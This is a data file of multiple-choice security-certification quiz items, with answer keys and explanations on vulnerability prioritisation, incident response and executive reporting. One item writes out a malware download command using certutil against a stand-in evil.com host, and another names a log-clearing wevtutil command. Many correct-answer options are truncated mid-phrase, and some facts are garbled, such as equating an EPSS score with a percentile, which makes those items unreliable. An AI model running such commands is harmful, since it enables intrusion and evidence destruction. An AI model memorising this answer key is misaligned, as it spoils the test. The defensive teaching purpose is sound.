    {q:"A security operations team receives a tip that an employee is about to leave and may be exfiltrating data. DLP alerts show 50GB uploaded to a personal Google Drive in the last 24 hours. Which combination of actions is MOST appropriate?",cat:"Security Operations",opts:["Immediately fire the employee","Preserve evidence","Only monitor for more activity","Delete all their files immediately"],ans:1,why:"Insider threat response requires: preserving evidence (for legal), preventing further exfiltration (block uploads, disable account), and engaging HR/legal for proper process — not unilateral action that could violate employment law.",ww:["Immediate termination without legal review creates liability.","","Only monitoring allows continued exfiltration.","Deleting files may violate evidence preservation requirements."],key:"Insider threat: preserve evidence + stop exfiltration + involve HR/legal. Don't act unilaterally."}
  ],
  "vuln_mgmt_d4": [
    {q:"A vulnerability scan reports a critical CVE (CVSS 9.1) on a database server. The server is in an isolated VLAN with no internet access and only two internal applications can connect to it. How should this vulnerability be PRIORITIZED?",cat:"Vulnerability Management",opts:["No action needed","High priority but not emergency","Critical","Low priority"],ans:1,why:"Context reduces effective risk — a CVSS 9.1 on an internet-facing server is emergency patch territory, but the same CVE on an isolated server with limited access is reduced risk. Contextual scoring (CVSS + environment) changes priority.",ww:["CVSS remains relevant — context modifies it, not eliminates it.","","CVSS alone without context leads to wasted effort — context reduces the practical risk here.","Isolated systems can still be reached by lateral movement — just with lower probability."],key:"Contextual risk scoring: CVSS 9.1 + isolated network + limited access = reduced priority. Context matters."},
    {q:"An application scanner finds SQL injection in a login form. The developer argues that the database is behind a WAF that blocks SQL injection. What is the BEST vulnerability management response?",cat:"Vulnerability Management",opts:["Close the finding","Escalate to the CISO immediately","Delete the finding","Document the WAF as a compensating control but"],ans:3,why:"WAFs are compensating controls — they can be bypassed, misconfigured, or disabled. Defense in depth requires fixing the underlying SQL injection vulnerability in the code, not relying solely on a WAF to prevent exploitation.",ww:["WAF bypass techniques exist — relying solely on WAF is insufficient.","Severity depends on context — but the finding should remain open until code is fixed.","The SQL injection exists and is real — the WAF is compensating, not eliminating the vuln.",""],key:"WAF = compensating control, not remediation. Fix the SQL injection in code. Defense in depth."},
    {q:"During a penetration test, the tester finds that the web application responds differently to valid vs invalid usernames during authentication (valid: 'incorrect password', invalid: 'user not found'). What vulnerability is this?",cat:"Vulnerability Management",opts:["Buffer overflow","SQL injection","CSRF","Username enumeration"],ans:3,why:"Different error messages for valid vs invalid usernames allow attackers to enumerate all valid accounts, then target only those accounts with credential attacks — reducing brute-force effort significantly.",ww:["Buffer overflow is memory-related — not authentication messaging.","SQL injection would execute database commands — not just reveal user existence.","CSRF is about forged requests — not login error messages.",""],key:"Username enumeration: different errors for valid/invalid accounts. Use generic 'invalid credentials' for all cases."},
    {q:"A CVSS 3.1 vector shows AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H. What does the S:C (Scope Changed) component mean?",cat:"Vulnerability Management",opts:["Successful exploitation can impact components","Only one system is affected","The attack is simple","The scope of affected users is wide"],ans:0,why:"Scope:Changed (S:C) means exploitation can affect systems beyond the vulnerable component's security boundary — a container escape that compromises the host, or a hypervisor escape affecting other VMs, are S:C examples.",ww:["","S:U means only the vulnerable component is affected — S:C means lateral impact is possible.","Scope component is not about complexity — that's Attack Complexity.","User scope is not what this metric measures."],key:"CVSS Scope Changed = exploitation escapes the component boundary. Container escape, hypervisor escape."},
    {q:"A vulnerability scanner reports a critical finding on a medical device running Windows XP Embedded. The vendor says no patch will be released. The device administers medication. What is the BEST response?",cat:"Vulnerability Management",opts:["Remove the device from service immediately","Ignore the vulnerability","Implement compensating controls: network","Patch Windows XP manually"],ans:2,why:"Medical devices cannot simply be taken offline — patient safety depends on them. Compensating controls (network isolation, whitelist, monitoring) reduce risk while coordinating with the vendor and medical leadership for risk acceptance.",ww:["Removing life-critical devices may harm patients — risk management is required.","No system is exempt — compensating controls and risk acceptance are required.","","Windows XP has no patch available and unsupported custom patching is dangerous."],key:"Legacy medical device: compensate + isolate + monitor + formal risk acceptance with clinical leadership."},
    {q:"During code review, a developer finds the following: SELECT * FROM users WHERE username='\" + userInput + \"'. What type of vulnerability is this and what is the fix?",cat:"Vulnerability Management",opts:["XSS","CSRF","SQL injection","Buffer overflow"],ans:2,why:"String concatenation of user input directly into SQL is classic SQL injection. The fix is parameterized queries (prepared statements) which separate SQL code from data — the database driver handles escaping.",ww:["XSS involves injecting scripts into HTML — this is SQL injection.","CSRF involves forged requests — not SQL string concatenation.","","Buffer overflow is memory allocation — not string SQL building."],key:"String concatenation in SQL = injection vulnerability. Fix: parameterized queries. Never concatenate user input."},
    {q:"A penetration tester successfully exploits a vulnerability to gain access to /etc/shadow on a Linux server. What is the IMMEDIATE security concern?",cat:"Vulnerability Management",opts:["The server will crash","/etc/shadow contains hashed passwords","This is normal file access","Only the local system is at risk"],ans:1,why:"/etc/shadow contains salted password hashes — with offline cracking tools (hashcat, John the Ripper), an attacker can recover cleartext passwords, especially weak ones, and reuse them across other systems (credential stuffing).",ww:["The server remains running — password exposure is the concern.","","Access to /etc/shadow is a critical security incident.","Recovered passwords enable lateral movement and account takeover across the environment."],key:"/etc/shadow access = offline password cracking possible. All weak passwords potentially compromised. Reset all."},
    {q:"An organization runs monthly vulnerability scans and finds the same critical vulnerabilities recurring in the same systems. What is the ROOT CAUSE most likely?",cat:"Vulnerability Management",opts:["Vulnerabilities are being closed without","The scanner is broken","CVSS scores changed","The systems are isolated"],ans:0,why:"Recurring vulnerabilities indicate either false closure (marking fixed without actually patching), re-introduction through vulnerable golden images used for deployment, or ephemeral systems spawning from unpatched templates.",ww:["","Scanner consistency is verified by checking other systems — recurring same vulns points to process failure.","CVSS scores rarely change — recurring same CVEs indicates process failure.","Isolated systems can still have recurring vulnerabilities."],key:"Recurring vulns = false closure OR vulnerable base image reintroducing issues. Fix the image, not just instances."},
    {q:"A web application allows users to upload profile pictures. The developer says files are stored on disk and served back to users. What vulnerability class is MOST relevant to this feature?",cat:"Vulnerability Management",opts:["DNS poisoning","CSRF","Unrestricted file upload","SQL injection"],ans:2,why:"File upload without proper validation enables attackers to upload web shells (PHP, ASPX files) disguised as images — if the server executes them, the attacker gains remote code execution. Validate file type, extension, and MIME type server-side.",ww:["DNS poisoning is a network attack — not application upload.","CSRF tricks browsers — not file upload functionality.","","SQL injection targets databases — not file upload."],key:"Unrestricted file upload = web shell upload = RCE. Validate file type, extension, MIME type, and rename on server."},
    {q:"EPSS score for a CVSS 7.5 vulnerability is 0.84 (84th percentile), while another CVSS 9.0 vulnerability has EPSS of 0.03 (3rd percentile). Which should be patched FIRST?",cat:"Vulnerability Management",opts:["The CVSS 9.0","They are equal priority","The CVSS 7.5 with 84th percentile EPSS","Neither is urgent"],ans:2,why:"EPSS measures probability of exploitation in the wild. An 84th percentile score means this vulnerability is being actively exploited far more than 84% of other CVEs — the actual threat probability far outweighs the slightly higher CVSS of the other.",ww:["CVSS alone ignores exploitation probability — EPSS shows which is actually being used by attackers.","Equal priority ignores the 81-percentile difference in exploitation probability.","","84th percentile EPSS is highly urgent."],key:"High EPSS (84th percentile) + medium CVSS > low EPSS + high CVSS. Exploitation probability changes priority."},
    {q:"During a cloud security assessment, ScoutSuite finds an S3 bucket with public read access containing files named 'backup-2024-prod-db.tar.gz'. What is the SEVERITY and why?",cat:"Vulnerability Management",opts:["High but not critical","Medium","Critical","Low"],ans:2,why:"Publicly accessible database backups are a catastrophic misconfiguration — they likely contain actual user data (PII), potentially hardcoded credentials, database schemas, and business-critical data. This is a critical finding requiring immediate remediation.",ww:["This is Critical — production database backups should never be publicly accessible.","Database backups typically contain production data including sensitive records.","","S3 buckets default to private — public access on sensitive data is a critical misconfiguration."],key:"Public S3 with database backups = Critical. Immediate: block access, rotate any exposed credentials, assess data breach."},
    {q:"A developer commits code with an AWS access key ID and secret hardcoded in a config file. The commit is pushed to a public GitHub repository. What is the CORRECT order of response?",cat:"Vulnerability Management",opts:["Only remove the file from the repo","Wait to see if it gets exploited","Delete the commit history and nothing else","Immediately revoke and rotate the compromised"],ans:3,why:"Exposed secrets may have been scraped by automated bots within seconds of the public commit. Immediate credential rotation stops unauthorized use. CloudTrail review reveals if exploitation already occurred. Removing from repo history prevents future exposure.",ww:["Removing the file doesn't invalidate already-exposed credentials.","Waiting allows attackers to use the credentials for hours or days.","Deleted commits may still be in git history — and credentials may already be compromised.",""],key:"Exposed secrets: IMMEDIATELY rotate credentials → check for abuse (CloudTrail) → then clean repo. Rotation first."},
    {q:"An application performs authorization checks on the client side using JavaScript: if(user.role === 'admin') { showAdminPanel(); }. What vulnerability does this demonstrate?",cat:"Vulnerability Management",opts:["SQL injection","XSS vulnerability","Client-side access control bypass","CSRF vulnerability"],ans:2,why:"Client-side authorization can be trivially bypassed by modifying JavaScript in the browser console or using developer tools. All authorization decisions must be enforced server-side — the client is untrusted.",ww:["SQL injection targets databases — not JavaScript authorization.","XSS is script injection — this is client-side authorization logic.","","CSRF is forged requests — not client-side authorization."],key:"Client-side authorization = trivially bypassed. Must enforce authorization server-side on every request."},
    {q:"A vulnerability assessment finds a web server returning detailed error messages including stack traces and SQL query fragments when errors occur. What risk does this create?",cat:"Vulnerability Management",opts:["A minor usability issue","Only relevant to developers","Information disclosure","None"],ans:2,why:"Verbose error messages expose the application's internal architecture — server technology, framework versions, database types, file paths, table names — all valuable reconnaissance information for planning targeted attacks.",ww:["Information disclosure is a meaningful vulnerability — it enables more targeted attacks.","Attackers benefit from this information — not just developers.","","Error messages to users should be generic — detailed errors go to logs only."],key:"Verbose error messages = information disclosure. Return generic errors to users; detailed errors to logs only."}
  ],
  "incident_response_d4": [
    {q:"During ransomware response, the IR team discovers the attacker was in the environment for 47 days before deploying ransomware. The first indicator is a successful phishing email. What phase of the Cyber Kill Chain was the attacker in for 47 days?",cat:"Incident Response",opts:["Actions on Objectives","Command and Control only","Reconnaissance only","Delivery phase only"],ans:0,why:"Modern ransomware groups dwell for weeks or months — after initial access they move through Installation (persistence), C2, lateral movement, privilege escalation, and data staging (for double extortion) before triggering the final encryption.",ww:["","C2 is one phase — 47 days involved multiple post-access phases.","Reconnaissance happens before initial access.","Delivery is a single event (the phishing email) — not 47 days."],key:"47-day dwell = multiple post-access phases. Persistence + C2 + lateral movement + staging before final payload."},
    {q:"A memory dump from a compromised server shows a process with the following characteristics: no associated file on disk, parent process is winlogon.exe, network connection to 185.x.x.x:443. What forensic conclusion is MOST supported?",cat:"Incident Response",opts:["A Windows update component","Normal Windows authentication process","Fileless malware","Normal authentication traffic"],ans:2,why:"Winlogon.exe is an authentication process that should not spawn network-connected child processes or have children with no disk image. This pattern indicates process injection — fileless malware using HTTPS C2 to blend with normal web traffic.",ww:["Update components have disk-backed binaries from trusted paths.","Legitimate winlogon.exe does not establish external network connections.","","Authentication does not involve external IP connections."],key:"No disk + winlogon parent + external HTTPS = fileless injection. HTTPS C2 blends with normal traffic."},
    {q:"An analyst is investigating a breach and finds SMB traffic (port 445) moving east-west between workstations — not to domain controllers. Timestamps show this occurred between 2 AM and 4 AM over 3 consecutive nights. What does this MOST suggest?",cat:"Incident Response",opts:["Backup software","Normal Windows file sharing","Lateral movement using SMB","Normal domain controller communication"],ans:2,why:"East-west SMB between workstations at night is a classic lateral movement pattern — attackers using stolen NTLM hashes (Pass-the-Hash), SMB exploits, or admin shares to spread across the environment during low-monitoring hours.",ww:["Backups go to backup servers — not between workstations.","Normal file sharing goes through file servers — not workstation-to-workstation.","","DC communication is north-south (workstation to DC) — not workstation-to-workstation."],key:"East-west SMB between workstations = lateral movement. Pass-the-Hash or EternalBlue at 2-4 AM = attacker activity."},
    {q:"During post-incident forensics, an analyst finds that the attacker deleted Windows Event Logs using 'wevtutil cl Security'. What is the forensic implication?",cat:"Incident Response",opts:["While Windows logs are cleared","The attacker was not sophisticated","The investigation is over","This is a standard Windows cleanup procedure"],ans:0,why:"Log deletion is indicator of attacker sophistication but not total evidence destruction — SIEM already received the logs before deletion, Volume Shadow Copies may preserve previous log states, and other artifacts remain.",ww:["","Log deletion itself (if logged in SIEM) is evidence of attacker anti-forensic techniques.","Alternative evidence sources remain — SIEM, VSS, registry, prefetch.","wevtutil for log deletion is attacker anti-forensics — not standard procedure."],key:"Log deletion: check SIEM (ingested before deletion), VSS, prefetch, registry. Multiple evidence sources."},
    {q:"An incident responder receives a call: 'all files on the file server now have a .locked extension and there's a ransom note'. The server is still running and connected to the network. What are the FIRST TWO actions in order?",cat:"Incident Response",opts:["Pay the ransom first, then notify management","Reimage the server immediately","Notify the media first","1) Isolate the server from the network"],ans:3,why:"Order matters critically: (1) Network isolation stops spreading ransomware to other systems — this is the priority. (2) Don't power off immediately — running memory contains encryption keys, attacker tools, and forensic evidence that disappears on shutdown.",ww:["Paying ransom does not stop ongoing encryption spread — isolation is first.","Reimaging before forensic capture destroys all evidence of the attack vector.","Media notification is later — technical response first.",""],key:"Ransomware first response order: 1) Isolate network 2) Preserve memory/evidence BEFORE powering off."},
    {q:"A threat hunter uses the query 'parent_process:powershell.exe AND command_line:*-enc*' in the SIEM and finds 847 results. What does this search help identify?",cat:"Incident Response",opts:["Only legitimate scripts","PowerShell execution with encoded commands","Windows updates","Normal PowerShell administration"],ans:1,why:"PowerShell's -EncodedCommand flag (-enc) allows execution of Base64-encoded scripts — a common technique to bypass command-line detection rules. 847 results warrants investigation to identify malicious vs. legitimate encoded executions.",ww:["847 encoded executions requires investigation — most environments have far fewer legitimate encoded executions.","","Windows updates use signed MSI/EXE — not encoded PowerShell.","Encoded PowerShell is used by some legitimate tools but is primarily an obfuscation indicator."],key:"PowerShell -enc flag = encoded command = obfuscation indicator. Investigate volume and decode each for analysis."},
    {q:"During evidence acquisition for a major breach investigation, the lead responder takes a photo of the server rack with their personal phone. Why is this problematic from a forensic standpoint?",cat:"Incident Response",opts:["It is not problematic","Photos are always inadmissible","Personal phone photos are not part of the","Only video is acceptable evidence"],ans:2,why:"Forensic photography must be documented in the chain of custody log, taken with appropriate equipment, and properly cataloged. Personal phone photos may not meet court standards and could weaken the overall evidence package.",ww:["Photos are valuable but must follow forensic documentation procedures.","Photos can be admissible but only if properly documented in chain of custody.","","Photos are acceptable — the issue is the informal process, not the medium."],key:"Forensic photography: use official process, document in chain of custody, proper metadata. Personal phones = CoC gap."},
    {q:"An organization discovers that a contractor's VPN credentials were used to access the internal network and exfiltrate data 6 months after the contractor's engagement ended. What security control FAILED?",cat:"Incident Response",opts:["The encryption failed","The VPN protocol failed","The firewall failed","Account lifecycle management"],ans:3,why:"Contractor account hygiene is a fundamental identity lifecycle control — accounts must be deprovisioned immediately when engagement ends. Dormant accounts with VPN access are a common attack vector for initial access.",ww:["Encryption worked — the issue is credential management.","VPN protocol functioned correctly — the failure was identity lifecycle management.","Firewall functioned — the access was through legitimate VPN credentials.",""],key:"Contractor account not deprovisioned = access persists indefinitely. Account lifecycle = disable on day 1 of departure."},
    {q:"A SOC analyst receives an alert: 'Outbound DNS query for malware.ru from 192.168.1.50'. The analyst checks EDR and finds no malware on the endpoint. What should the analyst investigate NEXT?",cat:"Incident Response",opts:["Check if DNS is being used as a C2 channel (DNS","Close the alert","Ignore","Reimage the endpoint immediately"],ans:0,why:"DNS tunneling encodes data in DNS queries to bypass firewalls — long subdomains, high query frequency, and TXT record queries are indicators. No EDR detection doesn't mean no compromise — fileless malware can bypass EDR.",ww:["","An alert for known malware C2 domain should never be closed without thorough investigation.","EDR misses fileless and novel malware — DNS patterns are important additional evidence.","Reimaging before investigation destroys evidence of the C2 method."],key:"DNS query to malware domain + no EDR hit = possible DNS tunneling or fileless C2. Analyze DNS payload depth."},
    {q:"Post-incident analysis reveals that the attacker used valid MFA-enabled accounts to access the environment. The accounts were compromised via a real-time phishing proxy (adversary-in-the-middle). What security control would have BEST prevented this?",cat:"Incident Response",opts:["Network segmentation","FIDO2/hardware security keys","Stronger passwords","More frequent password rotation"],ans:1,why:"Adversary-in-the-Middle (AiTM) phishing proxies relay TOTP codes in real-time — the attacker sees the code instantly and reuses it before it expires. FIDO2 keys are bound to the legitimate domain and cannot be relayed to phishing sites.",ww:["Segmentation helps post-compromise — phishing-resistant MFA prevents initial authentication bypass.","","Strong passwords alone cannot defeat AiTM — credentials are relayed through the proxy.","TOTP codes were intercepted — more frequent rotation doesn't prevent relay attacks."],key:"AiTM bypasses TOTP MFA. Only FIDO2/hardware keys (domain-bound) prevent relay attacks."},
    {q:"During a breach investigation, the IR team discovers the attacker used the Windows built-in tool 'certutil.exe' to download malware: certutil -urlcache -split -f http://evil.com/mal.exe. What technique is this?",cat:"Incident Response",opts:["A physical attack","SQL injection","Living off the Land (LOLBin)","A normal Windows certificate operation"],ans:2,why:"Certutil's -urlcache functionality was not designed for general file download but attackers abuse it as a LOLBin since it's a signed Microsoft binary that many security tools and network proxies don't block.",ww:["This is a remote software technique — not physical.","SQL injection targets databases — not Windows binary abuse.","","Certutil is being used for malware download — not certificate operations."],key:"certutil -urlcache = LOLBin file download. Legitimate binary abused for malware delivery. Monitor with Sysmon."},
    {q:"An analyst is performing threat hunting and queries: 'EventID:4688 AND NewProcessName:*\\cmd.exe AND ParentProcessName:*\\word.exe'. What is this hunt looking for?",cat:"Incident Response",opts:["Macro execution","A scheduled task","Normal Windows behavior","Normal document editing"],ans:0,why:"Microsoft Word should never directly spawn cmd.exe under normal operation. This process relationship indicates a malicious macro executing system commands — a classic initial access technique via malicious document attachments.",ww:["","Scheduled tasks spawn from taskeng.exe or svchost — not Word.","Word→cmd.exe is always suspicious — it indicates macro execution.","Normal Word operation involves only document rendering processes."],key:"Word.exe spawning cmd.exe = malicious macro execution. Hunt for Office apps spawning shells."},
    {q:"A major breach was caused by an unpatched VPN appliance exploited via a zero-day. After remediation, the IR team presents findings. What SYSTEMIC improvements should the lessons learned recommend?",cat:"Incident Response",opts:["Only increase logging","Only patch the VPN appliance","Only notify the VPN vendor","Implement a vulnerability management process"],ans:3,why:"Systemic improvement addresses root causes and prevents recurrence: formal edge device patching process, behavioral monitoring for abnormal VPN patterns, segmentation to limit lateral movement post-compromise, and vendor advisory subscriptions.",ww:["More logging alone doesn't prevent the exploitation.","Patching only this instance doesn't prevent the next unpatched device being exploited.","Vendor notification is one step — systemic improvement is broader.",""],key:"Lessons learned = systemic fixes. Patch process + monitoring + segmentation + vendor advisory subscriptions."}
  ],
  "reporting_comms_d4": [
    {q:"An executive asks: 'Are we getting better at security?' Which metric BEST answers this question over a 12-month period?",cat:"Reporting & Communication",opts:["The number of security tools deployed","The number of incidents that occurred","The number of security staff hired","Trend analysis of MTTD"],ans:3,why:"Program maturity is best shown by improving metrics over time — faster detection (lower MTTD), faster response (lower MTTR), higher patch rates, and fewer recurring vulnerabilities demonstrate genuine security improvement.",ww:["Tool count doesn't measure effectiveness.","Incident count is influenced by threat landscape — KPI trends measure program response capability.","Headcount doesn't directly measure security outcomes.",""],key:"Proving improvement: trend KPIs over 12 months. Lower MTTD + MTTR + recurring findings = maturing program."},
    {q:"A CISO must present the security posture to the Board of Directors. Which format is MOST appropriate?",cat:"Reporting & Communication",opts:["A concise executive dashboard showing risk","A 200-page technical vulnerability report","Raw SIEM alert counts","A demo of the SIEM tool"],ans:0,why:"Board presentations require business context — risk in business terms, trends over time, compliance status, and strategic decisions requiring board input. Technical details belong in technical reports for operational teams.",ww:["","200-page technical reports are for technical teams — not boards.","Raw alert counts without context are meaningless to non-technical boards.","SIEM demos are for technical audiences — not board governance discussions."],key:"Board presentation = risk trends + top risks + compliance + strategic decisions. Business language, no technical depth."},
    {q:"A vulnerability management program has 1,200 open critical findings. The remediation team says they can close 50 per month. The CISO needs to communicate realistic expectations. What is the BEST framing?",cat:"Reporting & Communication",opts:["State it is impossible to fix","Promise all will be fixed immediately","Close all findings as accepted risk","Present a risk-prioritized remediation roadmap"],ans:3,why:"Realistic communication presents a prioritized roadmap with resource requirements — identifying which findings are highest risk (using CVSS + EPSS + asset value), estimating timelines, and requesting resources needed to accelerate.",ww:["Claiming impossibility without a roadmap abdicates security responsibility.","Promising immediate fixes for 1,200 critical findings is not credible.","Mass risk acceptance for 1,200 critical findings is negligent.",""],key:"Realistic vuln communication = risk-prioritized roadmap + timeline + resource requirements. Prioritize top-risk first."},
    {q:"After a breach notification is sent to customers, the organization receives media inquiries about the incident. Who should respond to media questions?",cat:"Reporting & Communication",opts:["The CISO directly in all cases","Designated spokesperson","Any available employee","The incident responder leading the technical"],ans:1,why:"Media communications require legal review and consistent messaging — ad-hoc technical responses can create legal liability, reveal sensitive investigation details, and contradict other communications. Designated spokespersons with approved messaging are required.",ww:["The CISO may speak to media in some cases but through the formal communications process, not ad-hoc.","","Employee ad-hoc responses create inconsistent and potentially harmful messages.","Technical responders should focus on the investigation — not media management."],key:"Media inquiries → designated PR spokesperson with legal-reviewed messaging. Never ad-hoc technical staff."},
    {q:"A vulnerability scan shows 3,000 findings. 2,800 are medium severity (CVSS 4-6.9), 150 are high (7-8.9), and 50 are critical (9-10). Using risk-based prioritization, where should remediation EFFORT be concentrated?",cat:"Reporting & Communication",opts:["All equally","The 2,800 medium findings","Only the newest findings","The 50 critical findings first (especially"],ans:3,why:"Pareto principle in security — 50 critical findings represent disproportionate risk. Criticality + exploitability drives urgency. After critical, address high findings. Mediums follow via systematic SLO-driven remediation.",ww:["Equal treatment wastes resources on low-risk while high-risk waits.","Volume of findings doesn't equal risk — prioritize by severity and exploitability.","Finding age is less important than current exploitability.",""],key:"Prioritize by risk not volume: Critical first → High → Medium. 50 criticals > 2,800 mediums."},
    {q:"An organization has a 24-hour SLO for critical vulnerability remediation. A critical finding is discovered on Friday at 5 PM. The remediation team works Monday-Friday. What is the correct action?",cat:"Reporting & Communication",opts:["Start remediation Monday","Document as an SLO exception automatically","Wait for the weekly vulnerability meeting","Escalate immediately"],ans:3,why:"SLOs measure calendar time, not business hours unless explicitly stated otherwise. A 24-hour SLO for critical vulnerabilities means action must begin within 24 hours — requiring on-call procedures and emergency change management capability.",ww:["SLOs don't pause for weekends unless explicitly defined as business hours.","SLO exceptions require formal approval — not automatic exception.","Weekly meetings are for program review — not emergency critical vulnerability response.",""],key:"24h SLO = calendar time. Weekend critical findings require on-call procedures and emergency change management."},
    {q:"After a major ransomware incident where backups were also encrypted, the organization's CTO argues they didn't need better backup procedures because 'the attackers were too sophisticated'. How should the CISO frame the lessons learned recommendation?",cat:"Reporting & Communication",opts:["The backup failure (attackers encrypting backups)","Recommend purchasing more security tools","Only address the ransomware vector","Agree with the CTO"],ans:0,why:"Attacker sophistication doesn't excuse preventable control failures. Backup encryption is well-known ransomware behavior — immutable backups (WORM, cloud versioning, air-gapped) are a known countermeasure that should have been implemented.",ww:["","Tool purchases without addressing the backup architecture gap misses the root cause.","Addressing only the ransomware vector ignores the backup failure that caused the impact.","Agreeing deflects accountability from preventable control gaps."],key:"Attacker sophistication doesn't excuse known preventable gaps. Immutable backups (WORM/air-gap) survive ransomware."},
    {q:"A compliance audit finds that the organization performs quarterly vulnerability scans as required by PCI DSS but has a critical vulnerability that has been open for 8 months. How do these findings conflict?",cat:"Reporting & Communication",opts:["Only PCI DSS auditors can determine risk","The compliance finding overrides the security","There is no conflict","Compliance and security are separate"],ans:3,why:"PCI DSS requires both regular scanning AND remediation. A 8-month-old critical finding violates PCI DSS requirements around timely remediation — compliance and security should align but scan frequency alone doesn't equal security posture.",ww:["Internal security teams are responsible for PCI compliance — not just external auditors.","Security metrics and compliance metrics should both drive action — not override each other.","Performing scans but not remediating findings likely violates PCI DSS remediation requirements.",""],key:"Compliance ≠ security. Scans performed ≠ vulnerabilities remediated. Both metrics required for real security posture."},
    {q:"A security analyst writes in an incident report: 'The threat actor exploited CVE-2024-1234 using a memory corruption vulnerability in the SSL library to achieve remote code execution and establish persistence via a webshell, then performed credential theft using mimikatz to harvest NTLM hashes for pass-the-hash lateral movement.' This section is intended for the executive briefing. What is wrong?",cat:"Reporting & Communication",opts:["It is too short","This section contains excessive technical","Executive briefings require all CVE details","Nothing"],ans:1,why:"Executive briefings must translate technical findings into business language — executives make resource and policy decisions, not technical ones. CVE numbers, memory corruption types, hash types, and tool names are irrelevant to their decision-making.",ww:["Length is secondary to appropriate detail level.","","CVEs belong in technical reports — not executive summaries.","Accuracy matters — but the audience determines the appropriate level of technical detail."],key:"Executive briefing = business language. What happened in plain terms + business impact. No CVEs or tool names."},
    {q:"An organization's mean time to detect (MTTD) has been decreasing over 6 months (60 days → 45 → 30 → 15 → 8 → 4 days). How should this be reported to leadership?",cat:"Reporting & Communication",opts:["State the program failed because MTTD isn't","Report the current value only","Report only to the technical team","Report the trend as a major security program"],ans:3,why:"MTTD trending from 60 to 4 days (93% reduction) is exceptional security program improvement — this demonstrates investments in detection (SIEM tuning, EDR, threat hunting) are working and should be highlighted to demonstrate program value.",ww:["4 days is excellent — reporting as a failure misrepresents a strong result.","Point-in-time metrics without trend context miss the improvement story.","Leadership needs to see program value to justify continued security investment.",""],key:"Trend reporting: 93% MTTD reduction = program success story. Show the improvement to justify investment."},
